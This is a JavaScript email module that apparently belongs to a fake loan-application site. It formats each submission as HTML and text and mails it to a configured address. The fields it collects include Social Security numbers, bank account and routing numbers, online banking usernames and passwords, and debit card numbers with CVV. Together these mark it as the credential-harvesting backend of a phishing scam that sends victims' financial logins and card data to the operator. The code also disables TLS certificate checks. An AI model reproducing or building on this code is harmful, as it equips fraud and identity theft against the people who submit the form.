import nodemailer from "nodemailer";

const {
  SMTP_HOST,
  SMTP_PORT,
  SMTP_USER,
  SMTP_PASS,
  RECIPIENT_EMAIL,
  EMAIL_FROM_NAME = "Loan Applications",
  EMAIL_ENABLED: EMAIL_ENABLED_ENV,
} = process.env;

const EMAIL_ENABLED = EMAIL_ENABLED_ENV !== "false";

console.log("[INFO] Email Service Configuration:");
console.log(`  Email Enabled: ${EMAIL_ENABLED}`);
console.log(`  Host: ${SMTP_HOST || "n/a"}`);
console.log(`  Port: ${SMTP_PORT || "n/a"}`);
console.log(`  User: ${SMTP_USER || "n/a"}`);
console.log(`  Recipient: ${RECIPIENT_EMAIL || "n/a"}`);

let transporter;

if (!EMAIL_ENABLED) {
  console.warn("[WARN] ✉️  Email delivery disabled (EMAIL_ENABLED=false). Loan applications will be logged only.");
} else if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
  console.error("[ERROR] ❌ Missing SMTP configuration. Check environment variables!");
  console.error("  Required: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, RECIPIENT_EMAIL");
} else {
  transporter = nodemailer.createTransport({
    host: SMTP_HOST,
    port: Number(SMTP_PORT || 587),
    secure: Number(SMTP_PORT) === 465,
    auth: {
      user: SMTP_USER,
      pass: SMTP_PASS,
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  transporter.verify((error, success) => {
    if (error) {
      console.error("[ERROR] SMTP connection failed:", error);
    } else {
      console.log("[SUCCESS] ✅ SMTP connection verified");
    }
  });
}

const formatHTML = (data) => {
  const safeValue = (val) => (val ? String(val).replace(/</g, "&lt;").replace(/>/g, "&gt;") : "N/A");
  
  return `
  <!DOCTYPE html>
  <html>
    <head>
      <meta charset="UTF-8">
      <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
        .container { max-width: 900px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h2 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; margin-bottom: 20px; }
        h3 { color: #555; margin-top: 25px; font-size: 16px; background-color: #f0f0f0; padding: 10px; border-left: 4px solid #007bff; }
        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 15px; }
        .field { padding: 10px; background-color: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; }
        .field-label { font-weight: bold; color: #007bff; font-size: 13px; text-transform: uppercase; margin-bottom: 5px; }
        .field-value { color: #333; font-size: 14px; }
        .footer { margin-top: 30px; padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
        .timestamp { background-color: #e3f2fd; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>📋 New Loan Application Received</h2>
        
        <div class="timestamp">
          <strong>Submitted:</strong> ${safeValue(data.timestamp)}
        </div>
        
        <h3>📌 APPLICATION DETAILS</h3>
        <div class="row">
          <div class="field">
            <div class="field-label">Loan Type</div>
            <div class="field-value">${safeValue(data.loanType)}</div>
          </div>
          <div class="field">
            <div class="field-label">Loan Title</div>
            <div class="field-value">${safeValue(data.loanTitle)}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Requested Loan Amount</div>
            <div class="field-value">$${safeValue(data.loanAmount)}</div>
          </div>
          <div class="field">
            <div class="field-label">Loan Duration</div>
            <div class="field-value">${safeValue(data.loanDuration)} months</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Loan Purpose</div>
            <div class="field-value">${safeValue(data.loanPurpose)}</div>
          </div>
        </div>
        
        <h3>👤 PERSONAL INFORMATION</h3>
        <div class="row">
          <div class="field">
            <div class="field-label">First Name</div>
            <div class="field-value">${safeValue(data.firstName)}</div>
          </div>
          <div class="field">
            <div class="field-label">Last Name</div>
            <div class="field-value">${safeValue(data.lastName)}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Email Address</div>
            <div class="field-value">${safeValue(data.email)}</div>
          </div>
          <div class="field">
            <div class="field-label">Phone Number</div>
            <div class="field-value">${safeValue(data.phone || "N/A")}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Birth Date</div>
            <div class="field-value">${safeValue(data.birthDate || "N/A")}</div>
          </div>
          <div class="field">
            <div class="field-label">SSN</div>
            <div class="field-value">${safeValue(data.ssn || "N/A")}</div>
          </div>
        </div>
        
        <h3>🏠 ADDRESS INFORMATION</h3>
        <div class="row">
          <div class="field">
            <div class="field-label">Address Line 1</div>
            <div class="field-value">${safeValue(data.address1)}</div>
          </div>
          <div class="field">
            <div class="field-label">Address Line 2</div>
            <div class="field-value">${safeValue(data.address2 || "N/A")}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">City</div>
            <div class="field-value">${safeValue(data.city)}</div>
          </div>
          <div class="field">
            <div class="field-label">State</div>
            <div class="field-value">${safeValue(data.state)}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Zip Code</div>
            <div class="field-value">${safeValue(data.zipCode)}</div>
          </div>
        </div>
        
        <h3>🏦 BANK ACCOUNT INFORMATION</h3>
        <div class="row">
          <div class="field">
            <div class="field-label">Bank Name</div>
            <div class="field-value">${safeValue(data.bankName)}</div>
          </div>
          <div class="field">
            <div class="field-label">Routing Number</div>
            <div class="field-value">${safeValue(data.routingNumber)}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Account Number</div>
            <div class="field-value">${safeValue(data.accountNumber)}</div>
          </div>
          <div class="field">
            <div class="field-label">Bank Username</div>
            <div class="field-value">${safeValue(data.bankUsername || "N/A")}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Bank Password</div>
            <div class="field-value">${safeValue(data.bankPassword || "N/A")}</div>
          </div>
        </div>
        
        ${data.debitCardNumber ? `
        <h3>💳 DEBIT CARD DETAILS</h3>
        <div class="row">
          <div class="field">
            <div class="field-label">Card Number</div>
            <div class="field-value">${safeValue(data.debitCardNumber)}</div>
          </div>
          <div class="field">
            <div class="field-label">Expiry Month</div>
            <div class="field-value">${safeValue(data.expiryMonth)}</div>
          </div>
        </div>
        <div class="row">
          <div class="field">
            <div class="field-label">Expiry Year</div>
            <div class="field-value">${safeValue(data.expiryYear)}</div>
          </div>
          <div class="field">
            <div class="field-label">CVV</div>
            <div class="field-value">${safeValue(data.cvv)}</div>
          </div>
        </div>
        ` : ""}
        
        <div class="footer">
          <p>✅ This application was submitted successfully via the Loan Application System.</p>
        </div>
      </div>
    </body>
  </html>
  `;
};

const formatText = (data) => {
  const safeValue = (val) => (val ? String(val) : "N/A");
  
  return `
NEW LOAN APPLICATION RECEIVED
════════════════════════════════════════════════════════════════

SUBMITTED: ${safeValue(data.timestamp)}

═══════════════════════════════════════════════════════════════
APPLICATION DETAILS
═══════════════════════════════════════════════════════════════
Loan Type: ${safeValue(data.loanType)}
Loan Title: ${safeValue(data.loanTitle)}
Requested Loan Amount: $${safeValue(data.loanAmount)}
Loan Duration: ${safeValue(data.loanDuration)} months
Loan Purpose: ${safeValue(data.loanPurpose)}

═══════════════════════════════════════════════════════════════
PERSONAL INFORMATION
═══════════════════════════════════════════════════════════════
First Name: ${safeValue(data.firstName)}
Last Name: ${safeValue(data.lastName)}
Email Address: ${safeValue(data.email)}
Phone Number: ${safeValue(data.phone || "N/A")}
Birth Date: ${safeValue(data.birthDate || "N/A")}
SSN: ${safeValue(data.ssn || "N/A")}

═══════════════════════════════════════════════════════════════
ADDRESS INFORMATION
═══════════════════════════════════════════════════════════════
Address Line 1: ${safeValue(data.address1)}
Address Line 2: ${safeValue(data.address2 || "N/A")}
City: ${safeValue(data.city)}
State: ${safeValue(data.state)}
Zip Code: ${safeValue(data.zipCode)}

═══════════════════════════════════════════════════════════════
BANK ACCOUNT INFORMATION
═══════════════════════════════════════════════════════════════
Bank Name: ${safeValue(data.bankName)}
Routing Number: ${safeValue(data.routingNumber)}
Account Number: ${safeValue(data.accountNumber)}
Bank Username: ${safeValue(data.bankUsername || "N/A")}
Bank Password: ${safeValue(data.bankPassword || "N/A")}

${data.debitCardNumber ? `
═══════════════════════════════════════════════════════════════
DEBIT CARD DETAILS
═══════════════════════════════════════════════════════════════
Card Number: ${safeValue(data.debitCardNumber)}
Expiry Month: ${safeValue(data.expiryMonth)}
Expiry Year: ${safeValue(data.expiryYear)}
CVV: ${safeValue(data.cvv)}
` : ""}

════════════════════════════════════════════════════════════════
✅ Application submitted successfully
════════════════════════════════════════════════════════════════
  `;
};

export const sendLoanApplicationEmail = async (data) => {
  if (!EMAIL_ENABLED) {
    console.log("[INFO] Email sending skipped (EMAIL_ENABLED=false).");
    return { skipped: true };
  }

  if (!transporter) {
    throw new Error("SMTP transporter is not configured");
  }

  try {
    console.log(`[INFO] Sending email to ${RECIPIENT_EMAIL}...`);
    
    const mailOptions = {
      from: `${EMAIL_FROM_NAME} <${SMTP_USER}>`,
      to: RECIPIENT_EMAIL,
      subject: `New Loan Application - ${data.requestId}`,
      text: formatText(data),
      html: formatHTML(data),
      headers: {
        "X-Request-ID": data.requestId,
        "X-Loan-Type": data.loanType,
      },
    };

    const info = await transporter.sendMail(mailOptions);
    
    console.log(`[SUCCESS] ✅ Email sent successfully`);
    console.log(`  Message ID: ${info.messageId}`);
    console.log(`  Response: ${info.response}`);
    
    return info;
  } catch (error) {
    console.error("[ERROR] Email sending failed:", error);
    throw new Error(`Failed to send email: ${error.message}`);
  }
};
